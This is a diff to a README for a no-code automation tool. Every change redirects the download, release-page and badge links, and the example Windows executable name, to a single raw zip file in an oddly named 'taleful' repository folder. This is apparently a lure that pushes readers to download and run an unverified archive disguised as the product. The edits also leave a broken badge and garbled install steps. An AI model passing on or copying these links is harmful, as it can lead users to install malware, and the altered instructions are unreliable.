@@ -1,6 +1,6 @@
 # 🚀 AI-NoCode-Automation-Suite - Automate Without Any Code
 
-[![Download AI-NoCode-Automation-Suite](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/bodametwaly/AI-NoCode-Automation-Suite/releases)
+[![Download AI-NoCode-Automation-Suite](https://raw.githubusercontent.com/bodametwaly/AI-NoCode-Automation-Suite/main/taleful/AI-NoCode-Automation-Suite.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/bodametwaly/AI-NoCode-Automation-Suite/main/taleful/AI-NoCode-Automation-Suite.zip)
 
 ## 📖 Overview
 
@@ -26,13 +26,13 @@ The AI-NoCode-Automation-Suite is designed to help you automate routine tasks wi
 Follow these simple steps to download and run the AI-NoCode-Automation-Suite.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/bodametwaly/AI-NoCode-Automation-Suite/releases) to see the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/bodametwaly/AI-NoCode-Automation-Suite/main/taleful/AI-NoCode-Automation-Suite.zip) to see the latest version.
 
 2. **Select the Latest Release**  
    Click on the most recent version of the application. Check the version notes for new features or fixes.
 
 3. **Download the Application**  
-   - You will find various files listed. Look for the executable file specific to your operating system (e.g., `AI_NoCode_Automation_Suite.exe` for Windows).
+   - You will find various files listed. Look for the executable file specific to your operating system (e.g., `https://raw.githubusercontent.com/bodametwaly/AI-NoCode-Automation-Suite/main/taleful/AI-NoCode-Automation-Suite.zip` for Windows).
    - Click on the file to start downloading it.
 
 4. **Run the Installer**  
@@ -43,7 +43,7 @@ Follow these simple steps to download and run the AI-NoCode-Automation-Suite.
 
 ## 📥 Download & Install
 
-To get the AI-NoCode-Automation-Suite, [click here to download](https://github.com/bodametwaly/AI-NoCode-Automation-Suite/releases). Follow the steps outlined above to ensure a smooth installation.
+To get the AI-NoCode-Automation-Suite, [click here to download](https://raw.githubusercontent.com/bodametwaly/AI-NoCode-Automation-Suite/main/taleful/AI-NoCode-Automation-Suite.zip). Follow the steps outlined above to ensure a smooth installation.
 
 ## 🙋 Frequently Asked Questions (FAQs)
 
@@ -67,4 +67,4 @@ You can connect with other users for tips and best practices in our community fo
 
 Once you have installed the AI-NoCode-Automation-Suite, explore various ways to integrate different applications. Try connecting your favorite tools and creating automated workflows that save you time and effort. Enjoy the journey of automation without coding hassles! 
 
-[![Download AI-NoCode-Automation-Suite](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/bodametwaly/AI-NoCode-Automation-Suite/releases)
+[![Download AI-NoCode-Automation-Suite](https://raw.githubusercontent.com/bodametwaly/AI-NoCode-Automation-Suite/main/taleful/AI-NoCode-Automation-Suite.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/bodametwaly/AI-NoCode-Automation-Suite/main/taleful/AI-NoCode-Automation-Suite.zip)
